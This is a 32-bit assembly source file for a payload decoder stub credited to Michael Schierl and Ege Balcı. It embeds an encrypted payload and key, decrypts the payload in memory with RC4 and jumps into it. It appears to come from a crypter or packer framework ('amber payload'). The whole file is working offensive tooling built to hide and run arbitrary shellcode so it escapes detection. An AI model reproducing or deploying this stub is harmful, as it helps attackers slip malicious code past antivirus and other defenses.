;-----------------------------------------------------------------------------;
; Authors: Michael Schierl, Ege Balcı
; Version: 2.0 (02 December 2017)
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP - Data to decode
;        ESI - Key
;		 ECX - Data size
; 		 EDI - Scratch place for S-box
; Direction flag has to be cleared
; Output: None. Data is decoded in place.
; Clobbers: EAX, EBX, ECX, EDX, EBP

  cld
  call start
Payload:
  incbin "payload.enc"
PSize: equ $-Payload
Key:
  incbin "payload.key"
KSize: equ $-Key
  ; Initialize S-box
start:
  pop ebp                 ; Pop out the address of payload to ebp
  lea esi,[ebp+PSize]     ; Load the address of key to esi
  mov ecx,PSize           ; Move the size of the amber payload to ecx
  mov edi,esp             ; Set the address of stack as scratch box  
  xor eax, eax            ; Start with 0
init:
  stosb                   ; Store next SBox byte S[i] = i
  inc al                  ; Increase byte to write (EDI is increased automatically)
  jnz init                ; Loop until we wrap around
  sub edi, 0x100          ; Restore EDI
  ; Permute S-box according to key
  xor ebx, ebx            ; Clear EBX (EAX is already cleared)
permute:
  add bl,[edi+eax]        ; BL += S[AL] + KEY[AL % sizeof(Key)]
  mov edx,eax             ; 
  and dl,KSize-1          ; dl & sizeof(Key)
  add bl,[esi+edx]        ; Move next byte of key to bl 
  mov dl,[edi+eax]        ; swap S[AL] and S[BL]
  xchg dl,[edi+ebx]       ; ..
  mov [edi+eax], dl       ; ..
  inc al                  ; AL += 1 until we wrap around
  jnz permute             ;
  ; Decryption loop
  xor ebx, ebx            ; Clear EBX (EAX is already cleared)
decrypt:
  inc al                ; AL += 1
  add bl,[edi+eax]      ; BL += S[AL]
  mov dl,[edi+eax]      ; swap S[AL] and S[BL]
  xchg dl,[edi+ebx]     ;
  mov [edi+eax], dl     ;
  add dl,[edi+ebx]      ; DL = S[AL]+S[BL]
  mov dl,[edi+edx]      ; DL = S[DL]
  xor [ebp],dl          ; [EBP] ^= DL
  inc ebp               ; Advance data pointer
  dec ecx               ; Reduce counter
  jnz decrypt           ; Until finished
  jmp Payload
